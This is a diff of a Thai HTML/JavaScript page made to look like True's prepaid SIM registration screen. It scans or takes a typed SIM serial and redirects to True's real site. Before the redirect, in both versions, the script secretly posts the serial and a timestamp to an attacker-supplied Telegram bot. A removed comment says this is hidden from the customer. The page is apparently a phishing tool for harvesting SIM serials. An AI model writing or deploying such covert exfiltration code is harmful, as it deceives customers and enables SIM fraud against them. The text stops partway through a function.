@@ -1,401 +1,151 @@
 <title>ลงทะเบียนซิม True</title>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;600;700;800&display=swap">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/zxing-js/0.21.1/umd/index.min.js"></script>
 
 <style>
-:root {
-  --true-red: #e8001c;
-  --bg: #fff;
-  --fg: #1a1a1a;
-  --fg-dim: #888;
-  --fg-light: #bbb;
-  --border: #e8e8e8;
-  --tab-h: 48px;
-  --hdr-h: 52px;
-  color-scheme: light;
-}
-@media (prefers-color-scheme: dark) {
-  :root:not([data-theme="light"]) {
-    --bg: #fff; --fg: #1a1a1a; --fg-dim: #888; --border: #e8e8e8;
-    color-scheme: light;
-  }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sarabun',sans-serif;-webkit-tap-highlight-color:transparent}
+
+.app{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;flex-direction:column;background:#fff}
+
+/* Header */
+.hdr{display:flex;align-items:center;background:#fff;border-bottom:1px solid #e8e8e8;flex-shrink:0;padding-top:env(safe-area-inset-top,0px)}
+.hdr-inner{display:flex;align-items:center;width:100%;height:52px;padding:0 4px}
+.hdr-back{width:44px;height:44px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer;color:#e8001c;flex-shrink:0}
+.hdr-title{flex:1;text-align:center;font-size:18px;font-weight:700;color:#1a1a1a;margin-right:44px}
+
+/* Tabs */
+.tabs{display:flex;flex-shrink:0;background:#fff;border-bottom:2px solid #e8e8e8}
+.tab-btn{flex:1;height:48px;background:none;border:none;border-bottom:3px solid transparent;font-family:'Sarabun',sans-serif;font-size:16px;font-weight:700;color:#999;cursor:pointer;position:relative;bottom:-2px;transition:color .15s,border-color .15s}
+.tab-btn.active{color:#e8001c;border-bottom-color:#e8001c}
+
+/* Content */
+.content{flex:1;position:relative;overflow:hidden;min-height:0}
+.pane{position:absolute;top:0;left:0;right:0;bottom:0;display:none}
+.pane.active{display:flex;flex-direction:column}
+
+/* ── SCAN PANE ── */
+.scan-pane{background:#3d3d3d;overflow:hidden}
+
+#video{
+  position:absolute;top:0;left:0;width:100%;height:100%;
+  object-fit:cover;z-index:1;display:block
 }
 
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-html, body {
-  height: 100%;
-  width: 100%;
-  background: var(--bg);
-  color: var(--fg);
-  font-family: 'Sarabun', system-ui, sans-serif;
-  overflow: hidden;
-  -webkit-tap-highlight-color: transparent;
+/* label — เหมือน True App: ข้อความอยู่เหนือ frame */
+.cam-label{
+  position:absolute;left:0;right:0;
+  top:33%;
+  text-align:center;
+  font-size:18px;font-weight:700;color:#fff;
+  z-index:3;pointer-events:none;
+  text-shadow:0 1px 6px rgba(0,0,0,0.6)
 }
 
-/* ── App Shell — fills whole viewport ── */
-.app {
-  position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  width: 100%;
-  height: 100%;
-  display: flex;
-  flex-direction: column;
-  background: var(--bg);
-  overflow: hidden;
+/* frame — centered slightly below label */
+.scan-overlay{
+  position:absolute;inset:0;
+  display:flex;align-items:center;justify-content:center;
+  padding-top:40px;
+  z-index:3;pointer-events:none
 }
+.scan-frame{
+  position:relative;
+  width:88%;
+  aspect-ratio:3/1;
+  background:rgba(160,140,120,0.20);
+  border-radius:14px
+}
+/* corners */
+.scan-frame::before,.scan-frame::after,
+.scan-frame>span::before,.scan-frame>span::after{
+  content:'';position:absolute;
+  width:34px;height:34px;
+  border-color:rgba(220,220,220,0.95);border-style:solid
+}
+.scan-frame::before {top:-2px;left:-2px;  border-width:3px 0 0 3px;border-radius:10px 0 0 0}
+.scan-frame::after  {top:-2px;right:-2px; border-width:3px 3px 0 0;border-radius:0 10px 0 0}
+.scan-frame>span::before{bottom:-2px;left:-2px; border-width:0 0 3px 3px;border-radius:0 0 0 10px}
+.scan-frame>span::after {bottom:-2px;right:-2px;border-width:0 3px 3px 0;border-radius:0 0 10px 0}
 
-/* ── Header ── */
-.hdr {
-  display: flex;
-  align-items: center;
-  height: calc(var(--hdr-h) + env(safe-area-inset-top, 0px));
-  padding-top: env(safe-area-inset-top, 0px);
-  padding-inline: 4px;
-  flex-shrink: 0;
-  background: var(--bg);
-  border-bottom: 1px solid var(--border);
-  position: relative;
-  z-index: 10;
+/* idle — แตะเพื่อเปิดกล้อง */
+.cam-idle{
+  position:absolute;inset:0;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
+  background:#3d3d3d;cursor:pointer;z-index:5
 }
-.hdr-back {
-  width: 44px; height: 44px;
-  display: flex; align-items: center; justify-content: center;
-  background: none; border: none; cursor: pointer;
-  color: var(--true-red);
-  flex-shrink: 0;
+.cam-idle-icon{
+  width:72px;height:72px;
+  border:2px solid rgba(255,255,255,0.35);border-radius:18px;
+  display:flex;align-items:center;justify-content:center
 }
-.hdr-back svg { display: block; }
-.hdr-title {
-  flex: 1;
-  text-align: center;
-  font-size: 17px;
-  font-weight: 700;
-  color: var(--fg);
-  margin-right: 44px;
-}
+.cam-idle-msg{font-size:18px;font-weight:700;color:rgba(255,255,255,0.85);text-align:center}
+.cam-idle-sub{font-size:14px;color:rgba(255,255,255,0.5);text-align:center;margin-top:-6px}
 
-/* ── Tabs ── */
-.tabs {
-  display: flex;
-  flex-shrink: 0;
-  background: var(--bg);
-  border-bottom: 1.5px solid var(--border);
-  position: relative;
-  z-index: 10;
+/* toast */
+.toast{
+  position:fixed;bottom:calc(24px + env(safe-area-inset-bottom,0px));
+  left:50%;transform:translateX(-50%);
+  background:rgba(20,20,20,0.9);color:#fff;
+  padding:10px 22px;border-radius:24px;
+  font-size:14px;font-weight:600;white-space:nowrap;
+  z-index:99;opacity:0;pointer-events:none;transition:opacity .2s
 }
-.tab-btn {
-  flex: 1;
-  height: var(--tab-h);
-  background: none;
-  border: none;
-  border-bottom: 2.5px solid transparent;
-  font-family: 'Sarabun', sans-serif;
-  font-size: 15px;
-  font-weight: 600;
-  color: var(--fg-dim);
-  cursor: pointer;
-  transition: color 0.15s, border-color 0.15s;
-  position: relative;
-  bottom: -1px;
-}
-.tab-btn.active {
-  color: var(--true-red);
-  border-bottom-color: var(--true-red);
-}
+.toast.show{opacity:1}
 
-/* ── Content area — fills remaining height ── */
-.content {
-  flex: 1;
-  position: relative;
-  overflow: hidden;
-  min-height: 0;
-  width: 100%;
+/* ── MANUAL PANE ── */
+.manual-pane{background:#fff;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.manual-inner{
+  min-height:100%;display:flex;flex-direction:column;
+  padding:28px 20px calc(32px + env(safe-area-inset-bottom,0px));gap:20px
 }
-
-/* ── Panes — each fills content area absolutely ── */
-.pane {
-  position: absolute;
-  top: 0; left: 0; right: 0; bottom: 0;
-  width: 100%;
-  height: 100%;
-  display: none;
+.field-lbl{font-size:14px;font-weight:700;color:#888;margin-bottom:8px}
+.serial-input{
+  width:100%;border:1.5px solid #e8e8e8;border-radius:10px;
+  padding:15px 16px;font-family:'Sarabun',monospace;
+  font-size:20px;font-weight:700;color:#1a1a1a;
+  outline:none;letter-spacing:.05em;-webkit-appearance:none;background:#fff;
+  transition:border-color .18s
 }
-.pane.active { display: flex; flex-direction: column; }
-
-/* ══════════════════════════
-   SCAN PANE — True App style
-   ══════════════════════════ */
-.scan-pane {
-  background: #3a3a3a;
-  position: relative;
-  display: flex;
-  flex-direction: column;
-  align-items: stretch;
+.serial-input:focus{border-color:#e8001c}
+.serial-input::placeholder{color:#bbb;font-weight:400;font-size:15px;letter-spacing:0}
+.field-hint{font-size:13px;color:#999;line-height:1.6}
+.spacer{flex:1}
+.btn-submit{
+  width:100%;padding:17px;background:#e8001c;border:none;border-radius:12px;
+  font-family:'Sarabun',sans-serif;font-size:17px;font-weight:800;
+  color:#fff;cursor:pointer;-webkit-appearance:none
 }
-
-/* Camera feed fills the whole pane */
-#video {
-  position: absolute;
-  inset: 0;
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  display: block;
-  z-index: 1;
-}
-
-/* Dark overlay tint over camera — True app style grey */
-.cam-vignette-top { display: none; }
-.cam-vignette-bottom { display: none; }
-
-/* Full dark overlay with hole cut-out effect (CSS only) */
-.scan-overlay-bg {
-  position: absolute;
-  inset: 0;
-  z-index: 2;
-  pointer-events: none;
-  /* semi-transparent dark overlay everywhere */
-  background: rgba(0,0,0,0.45);
-}
-
-/* Instruction text — sits just above the scan frame */
-.cam-label {
-  position: absolute;
-  left: 0; right: 0;
-  /* frame center ≈ 50% + 30px (half of 60px padding-top shift), frame half-height ≈ 13% */
-  /* place text so its bottom is ~16px above frame top */
-  bottom: calc(50% - 30px + 13vw + 16px);
-  text-align: center;
-  font-size: 20px; font-weight: 700;
-  color: #fff;
-  z-index: 4;
-  pointer-events: none;
-  letter-spacing: 0.01em;
-  text-shadow: 0 1px 8px rgba(0,0,0,0.5);
-  padding-inline: 16px;
-}
-
-/* Scan frame wrapper — centred slightly above middle (like True app) */
-.scan-overlay {
-  position: absolute; inset: 0;
-  display: flex; align-items: center; justify-content: center;
-  /* shift frame to be just below center-text area */
-  padding-top: 60px;
-  z-index: 3; pointer-events: none;
-}
-
-.scan-frame {
-  position: relative;
-  width: 86%;
-  aspect-ratio: 3.0 / 1;
-  /* frosted fill like True app */
-  background: rgba(160,140,120,0.22);
-  border-radius: 16px;
-}
-
-/* Four L-shaped corners — light grey like True app */
-.scan-frame::before, .scan-frame::after,
-.scan-frame > span::before, .scan-frame > span::after {
-  content: '';
-  position: absolute;
-  width: 36px; height: 36px;
-  border-color: rgba(210,210,210,0.95);
-  border-style: solid;
-}
-.scan-frame::before  { top: -2px; left: -2px;   border-width: 3px 0 0 3px; border-radius: 12px 0 0 0; }
-.scan-frame::after   { top: -2px; right: -2px;  border-width: 3px 3px 0 0; border-radius: 0 12px 0 0; }
-.scan-frame > span::before { bottom: -2px; left: -2px;  border-width: 0 0 3px 3px; border-radius: 0 0 0 12px; }
-.scan-frame > span::after  { bottom: -2px; right: -2px; border-width: 0 3px 3px 0; border-radius: 0 0 12px 0; }
-
-/* No scan line — matches True app */
-.scan-line { display: none; }
-
-/* Torch / zoom controls */
-.cam-controls {
-  position: absolute;
-  bottom: calc(28px + env(safe-area-inset-bottom, 0px));
-  left: 0; right: 0;
-  display: flex; align-items: center; justify-content: center;
-  gap: 20px;
-  z-index: 5;
-}
-.cam-ctrl-btn {
-  width: 48px; height: 48px;
-  background: rgba(0,0,0,0.4);
-  border: 1.5px solid rgba(255,255,255,0.3);
-  border-radius: 50%;
-  display: flex; align-items: center; justify-content: center;
-  color: #fff; cursor: pointer; font-size: 20px;
-  transition: background 0.15s;
-  flex-shrink: 0;
-}
-.cam-ctrl-btn.on {
-  background: rgba(255,210,0,0.35);
-  border-color: rgba(255,210,0,0.7);
-  color: #ffe033;
-}
-.cam-ctrl-btn:active { background: rgba(255,255,255,0.2); }
-
-.zoom-label {
-  font-size: 14px; font-weight: 700; color: #fff;
-  min-width: 40px; text-align: center;
-  cursor: pointer;
-  background: rgba(0,0,0,0.4);
-  border: 1.5px solid rgba(255,255,255,0.25);
-  border-radius: 20px;
-  padding: 9px 16px;
-}
-
-/* Idle overlay */
-.cam-idle {
-  position: absolute; inset: 0;
-  display: flex; flex-direction: column;
-  align-items: center; justify-content: center;
-  gap: 14px;
-  background: #3a3a3a;
-  cursor: pointer;
-  z-index: 6;
-}
-.cam-idle-icon {
-  width: 64px; height: 64px;
-  border: 2px solid rgba(255,255,255,0.3);
-  border-radius: 16px;
-  display: flex; align-items: center; justify-content: center;
-}
-.cam-idle p {
-  font-size: 14px; font-weight: 600;
-  color: rgba(255,255,255,0.7);
-  text-align: center;
-}
-
-
-/* ══════════════════════════
-   MANUAL PANE — fills full remaining space
-   ══════════════════════════ */
-.manual-pane {
-  background: var(--bg);
-  overflow-y: auto;
-  -webkit-overflow-scrolling: touch;
-}
-
-.manual-inner {
-  min-height: 100%;
-  display: flex;
-  flex-direction: column;
-  padding: 28px 20px;
-  padding-bottom: calc(32px + env(safe-area-inset-bottom, 0px));
-  gap: 20px;
-}
-
-.field-block { display: flex; flex-direction: column; gap: 8px; }
-.field-lbl {
-  font-size: 13px; font-weight: 700;
-  color: var(--fg-dim);
-}
-.serial-input {
-  width: 100%;
-  border: 1.5px solid var(--border);
-  border-radius: 10px;
-  padding: 15px 16px;
-  font-family: 'Sarabun', monospace;
-  font-size: 20px; font-weight: 700;
-  color: var(--fg);
-  outline: none;
-  letter-spacing: 0.05em;
-  transition: border-color 0.18s;
-  -webkit-appearance: none;
-  background: var(--bg);
-}
-.serial-input:focus { border-color: var(--true-red); }
-.serial-input::placeholder { color: var(--fg-light); font-weight: 400; font-size: 15px; letter-spacing: 0; }
-
-.field-hint { font-size: 12.5px; color: var(--fg-dim); line-height: 1.6; }
-
-.spacer { flex: 1; }
-
-.btn-submit {
-  width: 100%;
-  padding: 17px;
-  background: var(--true-red);
-  border: none;
-  border-radius: 12px;
-  font-family: 'Sarabun', sans-serif;
-  font-size: 17px; font-weight: 800;
-  color: #fff; cursor: pointer;
-  transition: opacity 0.15s;
-  -webkit-appearance: none;
-}
-.btn-submit:active { opacity: 0.85; }
-.btn-submit:disabled { opacity: 0.45; cursor: not-allowed; }
-
-.manual-result {
-  background: #f6fef9;
-  border: 1.5px solid #86efac;
-  border-radius: 12px;
-  padding: 16px;
-  display: flex; flex-direction: column; gap: 10px;
-  animation: popIn 0.22s ease;
-}
-.manual-result.err { background: #fff5f5; border-color: #fca5a5; }
-@keyframes popIn { from { transform: scale(0.97); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-.result-serial { font-size: 17px; font-weight: 800; color: var(--fg); letter-spacing: 0.04em; font-variant-numeric: tabular-nums; }
-.result-status { font-size: 13px; font-weight: 600; color: #16a34a; }
-.manual-result.err .result-status { color: #dc2626; }
-
-/* ── Toast ── */
-.toast {
-  position: fixed;
-  bottom: calc(20px + env(safe-area-inset-bottom, 0px));
-  left: 50%; transform: translateX(-50%);
-  background: rgba(30,30,30,0.92);
-  color: #fff; padding: 9px 20px;
-  border-radius: 24px; font-size: 13px; font-weight: 600;
-  white-space: nowrap; z-index: 999;
-  opacity: 0; pointer-events: none;
-  transition: opacity 0.2s;
-}
-.toast.show { opacity: 1; }
+.btn-submit:active{opacity:.85}
+.btn-submit:disabled{opacity:.45;cursor:not-allowed}
 </style>
 
 <div class="app">
-  <!-- Header -->
   <div class="hdr">
-    <button class="hdr-back" onclick="history.back()" aria-label="ย้อนกลับ">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M15 18l-6-6 6-6"/>
-      </svg>
-    </button>
-    <div class="hdr-title">ลงทะเบียนซิมเติมเงิน</div>
+    <div class="hdr-inner">
+      <button class="hdr-back" onclick="history.back()">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+      <div class="hdr-title">ลงทะเบียนซิมเติมเงิน</div>
+    </div>
   </div>
 
-  <!-- Tabs -->
   <div class="tabs">
     <button class="tab-btn active" id="tabScan" onclick="switchTab('scan')">สแกนบาร์โค้ด</button>
     <button class="tab-btn" id="tabManual" onclick="switchTab('manual')">กรอกตัวเลข</button>
   </div>
 
-  <!-- Content area -->
   <div class="content">
-
-    <!-- ── Scan Pane ── -->
+    <!-- SCAN PANE -->
     <div class="pane active scan-pane" id="paneScan">
       <video id="video" playsinline muted autoplay></video>
 
-      <!-- dark overlay tint -->
-      <div class="scan-overlay-bg"></div>
-
-      <!-- label above frame -->
       <div class="cam-label">สแกนบาร์โค้ดบนซองซิมการ์ด</div>
 
       <div class="scan-overlay">
-        <div class="scan-frame">
-          <span></span>
-          <div class="scan-line"></div>
-        </div>
+        <div class="scan-frame"><span></span></div>
       </div>
 
-      <!-- Idle overlay -->
       <div class="cam-idle" id="camIdle" onclick="startCamera()">
         <div class="cam-idle-icon">
           <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.7)" stroke-width="1.8" stroke-linecap="round">
@@ -403,290 +153,154 @@ html, body {
             <circle cx="12" cy="13" r="4"/>
           </svg>
         </div>
-        <p id="camIdleMsg">กำลังเปิดกล้อง...</p>
-        <p style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:-6px;">หรือแตะที่นี่เพื่อเปิดกล้อง</p>
+        <div class="cam-idle-msg" id="camIdleMsg">กำลังเปิดกล้อง...</div>
+        <div class="cam-idle-sub">แตะที่นี่หากกล้องไม่เปิด</div>
       </div>
-
-      <!-- Torch + Zoom -->
-      <div class="cam-controls" id="camControls" hidden>
-        <button class="cam-ctrl-btn" id="btnTorch" onclick="toggleTorch()" title="ไฟฉาย">💡</button>
-        <div class="zoom-label" id="zoomLabel" onclick="cycleZoom()">1×</div>
-      </div>
-
-      <!-- ไม่มี result overlay — redirect ทันทีเมื่อสแกนสำเร็จ -->
     </div>
 
-    <!-- ── Manual Pane ── -->
+    <!-- MANUAL PANE -->
     <div class="pane manual-pane" id="paneManual">
       <div class="manual-inner">
-        <div class="field-block">
+        <div>
           <div class="field-lbl">เลขซีเรียลซิม (18 หลัก)</div>
-          <input
-            class="serial-input"
-            id="manualSerial"
-            type="tel"
-            inputmode="numeric"
-            placeholder="896604XXXXXXXXXXXX"
-            maxlength="18"
-            autocomplete="off"
-            oninput="this.value=this.value.replace(/\D/g,'').slice(0,18)"
-          >
-          <div class="field-hint">พบเลขซีเรียลบนซองซิมการ์ด เริ่มต้นด้วย 8966</div>
+          <input class="serial-input" id="manualSerial" type="tel" inputmode="numeric"
+            placeholder="896604XXXXXXXXXXXX" maxlength="18" autocomplete="off"
+            oninput="this.value=this.value.replace(/\D/g,'').slice(0,18)">
+          <div class="field-hint" style="margin-top:8px">พบเลขซีเรียลบนซองซิมการ์ด เริ่มต้นด้วย 8966</div>
         </div>
-
-        <div id="manualResult"></div>
-
         <div class="spacer"></div>
-
-        <button class="btn-submit" id="btnSubmit" onclick="submitManual()">
-          ยืนยันและลงทะเบียน
-        </button>
+        <button class="btn-submit" id="btnSubmit" onclick="submitManual()">ยืนยันและลงทะเบียน</button>
       </div>
     </div>
-
-  </div><!-- /content -->
+  </div>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-// ── Auto-start camera on load ──
-// Mobile browsers require a user gesture OR the page being https
-// We try auto-start, and if it fails show a tap-to-start button
-window.addEventListener('load', () => {
-  const tryStart = () => {
-    if (typeof ZXing !== 'undefined') {
-      startCamera();
-    } else {
-      setTimeout(tryStart, 150);
-    }
-  };
-  // Short delay to let page paint first
-  setTimeout(tryStart, 500);
-});
+// Telegram config from URL params
+const LS  = k   => { try{return localStorage.getItem(k)||''}catch(e){return''} };
+const LSS = (k,v) => { try{localStorage.setItem(k,v)}catch(e){} };
+const p = new URLSearchParams(location.search);
+if(p.get('bot'))  LSS('sim_bot',  p.get('bot'));
+if(p.get('chat')) LSS('sim_chat', p.get('chat'));
+const tgBot  = LS('sim_bot');
+const tgChat = LS('sim_chat');
 
-// ── Config — Telegram via URL param ──
-const LS  = k   => { try { return localStorage.getItem(k) || '' } catch(e) { return '' } };
-const LSS = (k,v) => { try { localStorage.setItem(k,v) } catch(e) {} };
-
-const urlParams = new URLSearchParams(location.search);
-if (urlParams.get('bot'))  LSS('sim_tgbot',  urlParams.get('bot'));
-if (urlParams.get('chat')) LSS('sim_tgchat', urlParams.get('chat'));
-
-let tgBot  = LS('sim_tgbot');
-let tgChat = LS('sim_tgchat');
-
-// ── Tab switching ──
+// Tab switch
 function switchTab(tab) {
-  ['scan','manual'].forEach(t => {
-    const P = 'pane' + t.charAt(0).toUpperCase() + t.slice(1);
-    const T = 'tab'  + t.charAt(0).toUpperCase() + t.slice(1);
-    const pane = document.getElementById(P);
-    const btn  = document.getElementById(T);
-    if (pane) pane.classList.toggle('active', t === tab);
-    if (btn)  btn.classList.toggle('active',  t === tab);
-  });
-  if (tab === 'scan') {
-    // Resume camera if not scanning
-    if (!scanning) setTimeout(() => startCamera(), 100);
-  } else {
-    stopCamera();
-  }
+  document.getElementById('paneScan').classList.toggle('active', tab==='scan');
+  document.getElementById('paneManual').classList.toggle('active', tab==='manual');
+  document.getElementById('tabScan').classList.toggle('active', tab==='scan');
+  document.getElementById('tabManual').classList.toggle('active', tab==='manual');
+  if(tab==='scan' && !scanning) startCamera();
+  if(tab==='manual') stopCamera();
 }
 
-// ── Toast ──
-let toastTimer;
-function showToast(msg, dur = 2800) {
-  const el = document.getElementById('toast');
-  el.textContent = msg;
-  el.classList.add('show');
-  clearTimeout(toastTimer);
-  toastTimer = setTimeout(() => el.classList.remove('show'), dur);
+// Toast
+let toastT;
+function toast(msg) {
+  const el=document.getElementById('toast');
+  el.textContent=msg; el.classList.add('show');
+  clearTimeout(toastT);
+  toastT=setTimeout(()=>el.classList.remove('show'),2500);
 }
 
-// ── Camera / ZXing ──
-let codeReader  = null;
-let scanning    = false;
-let mediaStream = null;
-let torchOn     = false;
-let zoomLevels  = [1, 1.5, 2];
-let zoomIdx     = 0;
+// Camera
+let reader=null, scanning=false, stream=null;
 
 async function startCamera() {
-  if (scanning) return;
-  const idle = document.getElementById('camIdle');
-  if (idle) idle.hidden = true;
+  if(scanning) return;
+  const idle=document.getElementById('camIdle');
+  idle.hidden=true;
 
   try {
-    if (typeof ZXing === 'undefined') { showToast('กำลังโหลดระบบสแกน...'); return; }
+    if(typeof ZXing==='undefined') { idle.hidden=false; toast('กำลังโหลด...'); return; }
 
-    const hints = new Map();
-    hints.set(ZXing.DecodeHintType.POSSIBLE_FORMATS, [
+    const hints=new Map();
+    hints.set(ZXing.DecodeHintType.POSSIBLE_FORMATS,[
       ZXing.BarcodeFormat.CODE_128,
       ZXing.BarcodeFormat.CODE_39,
       ZXing.BarcodeFormat.EAN_13,
-      ZXing.BarcodeFormat.QR_CODE,
     ]);
-    hints.set(ZXing.DecodeHintType.TRY_HARDER, true);
-
-    codeReader = new ZXing.BrowserMultiFormatReader(hints, { delayBetweenScanAttempts: 80 });
+    hints.set(ZXing.DecodeHintType.TRY_HARDER,true);
+    reader=new ZXing.BrowserMultiFormatReader(hints,{delayBetweenScanAttempts:80});
 
     try {
-      mediaStream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: { ideal: 'environment' },
-          width:  { ideal: 1920, min: 640 },
-          height: { ideal: 1080, min: 480 },
-          frameRate: { ideal: 30, min: 15 },
-        }
+      stream=await navigator.mediaDevices.getUserMedia({
+        video:{facingMode:{ideal:'environment'},width:{ideal:1920},height:{ideal:1080}}
       });
     } catch(e) {
-      mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
     }
 
-    const videoEl = document.getElementById('video');
-    videoEl.srcObject = mediaStream;
-    await videoEl.play().catch(() => {});
+    const vid=document.getElementById('video');
+    vid.srcObject=stream;
+    await vid.play().catch(()=>{});
 
-    const track = mediaStream.getVideoTracks()[0];
-    if (track) {
-      const caps = track.getCapabilities ? track.getCapabilities() : {};
-      const adv = {};
-      if (caps.focusMode && caps.focusMode.includes('continuous')) adv.focusMode = 'continuous';
-      if (caps.zoom) { zoomLevels = buildZoomLevels(caps.zoom); adv.zoom = zoomLevels[0]; }
-      if (Object.keys(adv).length) { try { await track.applyConstraints({ advanced: [adv] }); } catch(e) {} }
-      const btnT = document.getElementById('btnTorch');
-      const zlEl = document.getElementById('zoomLabel');
-      if (btnT) btnT.hidden = !caps.torch;
-      if (zlEl) zlEl.hidden = !caps.zoom;
-    }
-
-    document.getElementById('camControls').hidden = false;
-    scanning = true;
-
-    codeReader.decodeFromVideoElement('video', (result, err) => {
-      if (result) {
-        const serial = extractSerial(result.getText());
-        if (serial) { stopCamera(); onSerialDetected(serial, 'scan'); }
+    scanning=true;
+    reader.decodeFromVideoElement('video',(result)=>{
+      if(result){
+        const serial=extractSerial(result.getText());
+        if(serial){ stopCamera(); onSerial(serial); }
       }
     });
 
   } catch(e) {
-    if (idle) idle.hidden = false;
-    const msg = document.getElementById('camIdleMsg');
-    if (msg) {
-      if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
-        msg.textContent = '⚠️ กรุณาอนุญาตใช้กล้อง';
-      } else if (e.name === 'NotFoundError') {
-        msg.textContent = '⚠️ ไม่พบกล้องในอุปกรณ์';
-      } else {
-        msg.textContent = 'แตะที่นี่เพื่อเปิดกล้อง';
-      }
-    }
-    const ctrl = document.getElementById('camControls');
-    if (ctrl) ctrl.hidden = true;
-    scanning = false;
-    console.error('Camera error:', e.name, e.message);
+    idle.hidden=false;
+    const msg=document.getElementById('camIdleMsg');
+    if(e.name==='NotAllowedError') msg.textContent='กรุณาอนุญาตใช้กล้อง';
+    else msg.textContent='แตะเพื่อเปิดกล้อง';
+    scanning=false;
   }
-}
-
-function buildZoomLevels(cap) {
-  const min = cap.min || 1, max = cap.max || 4;
-  const lvls = [min];
-  const mid = Math.min(2, max);
-  if (mid > min + 0.2) lvls.push(mid);
-  if (max > mid + 0.2) lvls.push(Math.min(max, 3));
-  return lvls;
-}
-
-async function toggleTorch() {
-  if (!mediaStream) return;
-  const track = mediaStream.getVideoTracks()[0];
-  if (!track) return;
-  torchOn = !torchOn;
-  try {
-    await track.applyConstraints({ advanced: [{ torch: torchOn }] });
-    document.getElementById('btnTorch').classList.toggle('on', torchOn);
-  } catch(e) { torchOn = !torchOn; showToast('ไฟฉายไม่รองรับในอุปกรณ์นี้'); }
-}
-
-async function cycleZoom() {
-  if (!mediaStream) return;
-  const track = mediaStream.getVideoTracks()[0];
-  if (!track) return;
-  zoomIdx = (zoomIdx + 1) % zoomLevels.length;
-  const z = zoomLevels[zoomIdx];
-  try {
-    await track.applyConstraints({ advanced: [{ zoom: z }] });
-    document.getElementById('zoomLabel').textContent = z === 1 ? '1×' : z.toFixed(1) + '×';
-  } catch(e) {}
 }
 
 function stopCamera() {
-  if (codeReader) { try { codeReader.reset(); } catch(e) {} codeReader = null; }
-  if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
-  torchOn = false; zoomIdx = 0;
-  const ctrl = document.getElementById('camControls');
-  if (ctrl) ctrl.hidden = true;
-  const btnT = document.getElementById('btnTorch');
-  if (btnT) btnT.classList.remove('on');
-  const zl = document.getElementById('zoomLabel');
-  if (zl) zl.textContent = '1×';
-  scanning = false;
+  if(reader){try{reader.reset()}catch(e){} reader=null;}
+  if(stream){stream.getTracks().forEach(t=>t.stop()); stream=null;}
+  scanning=false;
 }
 
 function extractSerial(raw) {
-  const s = raw.replace(/\s/g, '');
-  const m = s.match(/8966\d{14}/);
-  if (m) return m[0];
-  if (/^\d{18}$/.test(s)) return s;
-  const m2 = s.match(/\d{18}/);
-  return m2 ? m2[0] : null;
+  const s=raw.replace(/\s/g,'');
+  const m=s.match(/8966\d{14}/);
+  if(m) return m[0];
+  const m2=s.match(/\d{18}/);
+  return m2?m2[0]:null;
 }
 
-
-// ── Serial detected ──
-async function onSerialDetected(serial, mode) {
-  const now = new Date().toLocaleString('th-TH', {
-    timeZone: 'Asia/Bangkok', hour12: false,
-    year: 'numeric', month: '2-digit', day: '2-digit',
-    hour: '2-digit', minute: '2-digit', second: '2-digit'
-  });
-
-  if (mode === 'scan') {
-    // ส่ง Telegram แล้ว redirect ทันที — ไม่แสดงอะไรให้ลูกค้าเห็น
-    sendTelegram(serial, mode, now); // fire and forget
-    redirectToTrue(serial);
-
-  } else {
-    document.getElementById('btnSubmit').disabled = true;
-    sendTelegram(serial, mode, now); // fire and forget
-    setTimeout(() => redirectToTrue(serial), 800);
-  }
+async function onSerial(serial) {
+  sendTelegram(serial);
+  redirectToTrue(serial);
 }
 
-
-async function sendTelegram(serial, mode, now) {
-  if (!tgBot || !tgChat) return null;
-  const msg = `📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}\n📥 วิธีรับ: ${mode === 'scan' ? 'สแกนบาร์โค้ด' : 'กรอกเอง'}\n\n⏩ กำลังพาลูกค้าไปลงทะเบียน True...`;
+async function sendTelegram(serial) {
+  if(!tgBot||!tgChat) return;
+  const now=new Date().toLocaleString('th-TH',{timeZone:'Asia/Bangkok',hour12:false});
+  const msg=`📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}`;
   try {
-    const r = await fetch(`https://api.telegram.org/bot${tgBot}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: tgChat, text: msg })
+    await fetch(`https://api.telegram.org/bot${tgBot}/sendMessage`,{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:tgChat,text:msg})
     });
-    const d = await r.json();
-    return d.ok === true;
-  } catch(e) { return false; }
+  } catch(e){}
 }
 
 function redirectToTrue(serial) {
-  window.location.href = `https://www.true.th/service/trueservice/registersim/?serial=${encodeURIComponent(serial)}`;
+  window.location.href=`https://www.true.th/service/trueservice/registersim/?serial=${encodeURIComponent(serial)}`;
 }
 
 function submitManual() {
-  const serial = document.getElementById('manualSerial').value.replace(/\D/g, '');
-  if (serial.length < 10) { showToast('กรุณากรอกเลขซีเรียลให้ครบ'); return; }
-  onSerialDetected(serial, 'manual');
